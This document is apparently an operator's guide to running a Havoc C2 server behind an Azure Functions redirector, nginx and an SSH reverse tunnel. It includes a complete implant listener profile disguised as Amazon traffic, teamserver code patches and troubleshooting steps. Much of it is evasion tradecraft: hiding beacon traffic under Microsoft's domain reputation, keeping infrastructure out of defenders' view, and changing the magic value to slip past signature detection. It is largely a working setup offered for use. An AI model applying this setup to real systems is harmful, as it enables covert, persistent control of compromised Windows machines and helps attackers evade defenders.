# Azure Functions Redirector Setup for Havoc C2

## Why Use Azure Functions as a Redirector

### Domain Reputation and Categorization

Azure Functions run on `*.azurewebsites.net` — a Microsoft-owned domain trusted by virtually every corporate proxy, firewall, and threat intel feed. Traffic to `azurewebsites.net` blends in with legitimate enterprise cloud traffic (Azure-hosted APIs, webhooks, internal tools). Most organizations cannot block `azurewebsites.net` without breaking their own cloud workloads.

Compare this to standing up a VPS with a fresh domain: that domain has no history, no categorization, and will immediately get flagged by threat intel services after the first beacon. With Azure Functions, the C2 traffic rides on Microsoft's domain reputation from day one.

### Infrastructure Separation

The Azure Function acts as a **domain-fronting alternative** — the Demon connects to a trusted Microsoft domain, but the traffic is proxied to infrastructure you control. This creates separation between the implant's hardcoded callback address and your actual C2 server:

- **Blue team sees**: HTTPS connections to `<something>.azurewebsites.net` — a legitimate Microsoft service
- **If the Azure Function is burned**: Spin up a new one in minutes with a new name; the VPS, SSH tunnel, and teamserver stay untouched
- **If the VPS is burned**: Point the Azure Function to a different backend; deployed implants keep calling the same Azure Function URL
- **Your home IP is never exposed**: The teamserver sits behind an SSH tunnel on your local network

### Cost and Disposability

Azure Functions on the Consumption plan are essentially free for C2 traffic volumes (1 million free executions/month). You can create and destroy them in seconds. Each engagement gets a fresh function with a unique subdomain. No server provisioning, no OS hardening, no exposed attack surface to defend.

### Why Not Just a VPS with a Domain?

A VPS with a purchased domain works, but:
- The domain needs time to age and build reputation (or you buy an expired domain, which has its own risks)
- The VPS IP is directly exposed to the target — a single IP lookup reveals your infrastructure
- If the domain or IP gets blocklisted, you lose everything
- TLS certificate transparency logs tie your domain to your infrastructure permanently

With Azure Functions in front, the target only ever sees Microsoft's IP ranges and Microsoft's domain. Your VPS domain is only known to the Azure Function.

### Why the Multi-Hop Chain (Azure → nginx → SSH → Teamserver)?

Each hop serves a purpose:

1. **Azure Function → nginx**: The Azure Function needs a stable HTTPS endpoint to proxy to. The nginx VPS provides a domain with a valid Let's Encrypt certificate and handles TLS termination.

2. **nginx → SSH tunnel**: nginx can't reach your home network directly. The SSH reverse tunnel punches through NAT/firewall from your local machine to the VPS, exposing the teamserver's port on the VPS's loopback interface.

3. **SSH tunnel → Teamserver**: The teamserver runs HTTP (not HTTPS) locally because TLS is already terminated at nginx. `BehindRedir = true` tells it to trust `X-Forwarded-For` headers for the real client IP instead of seeing every connection come from `127.0.0.1`.

You could collapse this (e.g., Azure Function directly to a public-facing teamserver), but you'd lose the infrastructure separation that makes this setup resilient.

## Architecture

```
Demon (Windows target)
  → Azure Function (:443, HTTPS)
    → nginx VPS (TLS termination, :443)
      → SSH reverse tunnel (:8443)
        → Teamserver (HTTP :4434, local network)
```

## Components

### 1. Azure Function (ReverseProxy)

C# HTTP-triggered Azure Function that proxies all requests to the nginx VPS domain.

**Key file**: `ReverseProxy.cs`

```csharp
// Forwards: https://<function>.azurewebsites.net/{*path}
//        → https://<domain>{path}{queryString}
```

**Critical limitation**: The Azure Function forwards `remoteResponse.Headers` but **NOT** `remoteResponse.Content.Headers`. In .NET, `Content-Type`, `Content-Length`, and `Content-Encoding` are content headers — they are stripped from the proxied response.

### 2. nginx VPS

Domain with valid TLS certificate (Let's Encrypt). Terminates TLS and proxies to the SSH tunnel.

**Setup script**: `~/Documents/OffensiveTools/Redirector/nginx-redirector.sh`

Key nginx config points:
- `gzip off;` in the proxy location block (prevents nginx from compressing responses)
- `proxy_set_header Host $server_name;` (sends the domain name, not the Azure Function hostname)
- Bot filtering (`~*curl`, `~*wget`, etc.) to block scanners
- `certbot certonly --webroot` (NOT `certbot --nginx`, which overwrites proxy config)

### 3. SSH Reverse Tunnel

Connects the VPS to the local teamserver.

```bash
ssh -R 0.0.0.0:8443:192.168.1.18:4434 -i key.pem user@VPS -N
```

Requires `GatewayPorts yes` in VPS `/etc/ssh/sshd_config`.

### 4. Teamserver

Runs HTTP (not HTTPS) on local network. The `BehindRedir` flag (set by `TrustXForwardedFor = true`) makes it start an HTTP listener even when `Secure = true`, and uses `X-Forwarded-For` for client IP.

```bash
./havoc server --profile ./profiles/amazon.yaotl -v --debug
```

## Profile Configuration

**File**: `profiles/amazon.yaotl`

### HavocId (Metadata in Query Parameter)

The 12-byte metadata token `[Size:4][Magic:4][AgentID:4]` is placed in a URL query parameter instead of the HTTP body. This is required for Azure Functions and other redirectors that may mangle HTTP request bodies.

```hcl
HavocId {
    Location = "parameter"
    Name     = "X-Amz-Security-Token"
}
```

The bulk encrypted payload stays in the POST body. Only the 12-byte metadata moves.

### UriPrefix

When using a redirector, the Azure Function's route prefix may be different from the Havoc listener URIs. `UriPrefix` prepends a path to all URIs in the Demon config so requests route correctly through the Azure Function.

```hcl
UriPrefix = "/config"
```

The teamserver strips this prefix before URI validation so the base URIs still match.

### Headers That Break Things

**DO NOT include `Accept-Encoding: gzip, deflate, br` in request headers.**

This was the root cause of commands/output not flowing after registration. The chain of failure:

1. Demon sends `Accept-Encoding: gzip, deflate, br` via WinHTTP
2. Azure Functions platform (IIS/Kestrel) sees this and compresses larger responses with gzip
3. WinHTTP does NOT have `WINHTTP_OPTION_DECOMPRESSION` enabled, so it returns compressed bytes raw
4. Demon tries to parse gzip-compressed bytes as protocol data and fails
5. Registration still works because the 4-byte response is below the compression threshold
6. Task responses are larger, get compressed, and break

**DO NOT use `Content-Type: text/html` in response headers.**

This tells every intermediary "this is HTML content," which triggers:
- Content processing and character encoding adjustments
- Compression heuristics (HTML is highly compressible)
- Potential content rewriting by proxies/CDNs

Use `Content-Type: application/octet-stream` instead — it tells intermediaries to treat the response as raw binary and leave it alone.

### Working Profile

```hcl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm       = "/usr/bin/nasm"
    }
}

Operators {
    user "dmcxblue" {
        Password = "rt2025"
    }
}

Demon {
    Sleep  = 10
    Jitter = 35

    TrustXForwardedFor = true

    Injection {
        Spawn64 = "C:\\Windows\\System32\\svchost.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\svchost.exe"
    }
}

Listeners {
    Http {
        Name         = "DevTunnel"
        Hosts        = ["<azure-function>.azurewebsites.net"]
        HostBind     = "192.168.1.18"
        HostRotation = "round-robin"
        PortBind     = 4434
        PortConn     = 443
        Secure       = true
        KillDate     = "2028-06-10 23:59:59"
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

        UriPrefix = "/config"

        Uris = [
            "/gp/cart/view.html",
            "/gp/product/ajax",
            "/api/recommendations",
            "/gp/aod/ajax",
            "/s",
        ]

        Headers = [
            "Accept: */*",
            "Accept-Language: en-US,en;q=0.9",
            "Cache-Control: no-cache",
        ]

        HavocId {
            Location = "parameter"
            Name     = "X-Amz-Security-Token"
        }

        Response {
            Headers = [
                "Content-Type: application/octet-stream",
                "Cache-Control: no-store, max-age=0",
            ]
        }
    }
}
```

## Code Fixes Applied

### 1. UriPrefix Stripping (teamserver/pkg/handlers/http.go)

The Demon prepends `UriPrefix` to all URIs (e.g., `/config/gp/cart/view.html`). The teamserver validates against base URIs (e.g., `/gp/cart/view.html`). Without stripping the prefix, every request fails URI validation and gets a fake 404.

```go
requestPath := ctx.Request.URL.Path
if h.Config.UriPrefix != "" {
    requestPath = strings.TrimPrefix(requestPath, h.Config.UriPrefix)
}
```

### 2. DB Persistence Flattening (teamserver/cmd/server/listener.go)

`structs.Map()` creates nested maps for `DataLocation` and `Response` structs, which breaks JSON serialization for the SQLite database. Fixed by flattening these fields:

```go
delete(Info, "DataLocation")
Info["DataLocation"] = Config.(*handlers.HTTP).Config.DataLocation.Location
Info["DataLocationName"] = Config.(*handlers.HTTP).Config.DataLocation.Name
Info["ResponseDataLocation"] = Config.(*handlers.HTTP).Config.Response.DataLocation.Location
Info["ResponseDataLocationName"] = Config.(*handlers.HTTP).Config.Response.DataLocation.Name
Info["UriPrefix"] = Config.(*handlers.HTTP).Config.UriPrefix
Info["PortConn"] = Config.(*handlers.HTTP).Config.PortConn
Info["Methode"] = Config.(*handlers.HTTP).Config.Methode
Info["HostHeader"] = Config.(*handlers.HTTP).Config.HostHeader
```

### 3. DB Restore (teamserver/cmd/server/teamserver.go)

Added missing field restores when loading listener config from database after restart:

```go
if v, ok := Data["UriPrefix"].(string); ok {
    HandlerData.UriPrefix = v
}
if v, ok := Data["PortConn"].(string); ok {
    HandlerData.PortConn = v
}
// ... Methode, HostHeader
```

## nginx Script Fixes

- Changed `certbot --nginx` to `certbot certonly --webroot` (prevents certbot from overwriting nginx proxy config with `try_files`)
- Added `gzip off;` in proxy location block
- Changed `proxy_set_header Host $host;` to `proxy_set_header Host $server_name;`
- Removed `proxy_intercept_errors` (was silently converting 502s to 200 + decoy page, hiding tunnel issues)

## Troubleshooting

### Agent registers but commands don't flow
- Check for `Accept-Encoding: gzip` in profile headers — remove it
- Check response `Content-Type` — use `application/octet-stream`, not `text/html`
- Verify `gzip off;` in nginx location block

### Agent doesn't register (fake 404)
- Check teamserver logs for "invalid request path" — UriPrefix may not be stripped
- Check for "invalid header" — profile headers must match what the Demon sends
- Check for "Failed to extract metadata" — Data Location config mismatch

### 502 Bad Gateway
- SSH tunnel is down: `ss -tlnp | grep 8443` on VPS
- `GatewayPorts yes` not set in VPS sshd_config
- Tunnel bound to wrong port

### Testing the chain without a Demon
Use `fake_agent.py` to register a test agent through the full chain:
```bash
python3 fake_agent.py https://<azure-function>.azurewebsites.net
```

### Curl testing (bypass bot filter)
```bash
curl -sk https://<domain>/config/gp/cart/view.html \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    -H "Accept: */*" \
    -H "Accept-Language: en-US,en;q=0.9" \
    -H "Cache-Control: no-cache"
```

## HavocId Location Options

| Location | Request Behavior | Response Behavior |
|----------|-----------------|-------------------|
| `body` (default) | Full payload in POST body | Full response in body |
| `header` | 12-byte metadata base64 in custom header, rest in body | 12-byte metadata base64 in response header, rest in body |
| `cookie` | 12-byte metadata base64 in cookie, rest in body | 12-byte metadata base64 in Set-Cookie, rest in body |
| `parameter` | 12-byte metadata base64url (no padding) in query param, rest in body | Falls back to header behavior |

## Configurable Magic Value

The `Magic` field in the `Demon` profile section changes the 4-byte magic value in the 12-byte metadata token. Default is `0xDEADBEEF`. Changing it avoids signature-based detection.

```hcl
Demon {
    Magic = "0xCAFEBABE"
}
```

Both the Demon and teamserver must use the same value — the profile ensures this automatically.

The response Data Location defaults to `body` — it is NOT inherited from the request Data Location.
